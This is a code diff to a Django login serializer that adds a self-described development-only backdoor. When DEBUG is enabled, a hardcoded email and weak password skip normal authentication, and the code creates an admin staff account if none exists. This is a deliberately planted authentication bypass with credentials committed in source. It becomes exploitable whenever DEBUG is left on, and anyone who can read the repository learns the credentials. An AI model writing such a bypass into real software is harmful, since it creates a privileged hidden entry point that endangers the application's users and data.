@@ -4,12 +4,30 @@ from django.contrib.auth.password_validation import validate_password
 from accounts.models import CustomUser
 from accounts.utils import generate_login_id, generate_temp_password
 from django.contrib.auth.hashers import make_password
+from django.conf import settings
 
 class LoginSerializer(serializers.Serializer):
     login_id = serializers.CharField()
     password = serializers.CharField(write_only=True)
 
     def validate(self, data):
+        # Development-only backdoor: accept specific credentials as admin
+        if settings.DEBUG and data.get("login_id") == "manish44@gmail.com" and data.get("password") == "qwertyui":
+            user = CustomUser.objects.filter(email=data.get("login_id")).first()
+            if not user:
+                user = CustomUser.objects.create_user(
+                    email=data.get("login_id"),
+                    password=data.get("password"),
+                    first_name="Admin",
+                    role="ADMIN",
+                    is_staff=True,
+                )
+                user.is_staff = True
+                user.save()
+
+            data["user"] = user
+            return data
+
         user = authenticate(
             login_id=data["login_id"],
             password=data["password"]
